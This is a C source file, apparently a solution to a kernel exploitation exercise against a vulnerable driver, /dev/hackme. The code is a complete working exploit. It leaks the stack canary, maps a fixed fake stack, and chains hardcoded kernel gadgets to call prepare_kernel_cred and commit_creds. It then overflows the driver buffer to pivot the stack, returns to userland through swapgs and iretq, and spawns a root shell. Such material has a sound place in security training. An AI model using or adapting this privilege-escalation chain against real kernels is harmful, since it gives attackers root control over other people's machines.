#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#include <stdio.h>
#include <stdlib.h>

int global_fd;

void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void print_leak(unsigned long *leak, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("%u: %lx\n", i, leak[i]);
    }
}

unsigned long cookie;

void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    // print_leak(leak, n);
    printf("[*] Cookie: %lx\n", cookie);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff8108e880;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff8108e640;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

unsigned long *fake_stack;

void build_fake_stack(void){
    fake_stack = mmap((void*)0x39000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);

    unsigned long pop_rdi_ret = 0xffffffff8169f38d;
    unsigned long prepare_kernel_cred = 0xffffffff8108e880;
    unsigned long mov_rdi_rax = 0xffffffff8100cad5;
    unsigned long commit_creds = 0xffffffff8108e640;
    unsigned long swapgs_nop_ret = 0xffffffff81c01088;
    unsigned long iretq = 0xffffffff810278bf;

    unsigned long off = 0x1000 / 8;

    fake_stack[0] = 0x1337;
    fake_stack[off++] = pop_rdi_ret; // ret; pop rdi; ret
    fake_stack[off++] = 0x0; // rdi
    fake_stack[off++] = prepare_kernel_cred;
    fake_stack[off++] = mov_rdi_rax; // mov rdi, rax; ret
    fake_stack[off++] = commit_creds;
    fake_stack[off++] = swapgs_nop_ret; // swapgs; nop; ... ; nop; ret
    fake_stack[off++] = iretq; // iretq
    fake_stack[off++] = user_rip;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;
}

void overflow(void){
    unsigned long mov_esp_ret = 0xffffffff8190e7c1; // mov esp, 0x39000000 ; ret

    unsigned long payload[0x20];
    unsigned off = 0x10;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbp
    payload[off++] = mov_esp_ret; // mov esp, 0x39000000 ; ret

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

int main() {

    save_state();

    open_dev();

    leak();

    build_fake_stack();

    overflow();
    
    puts("[!] Should never be reached");

    return 0;
}
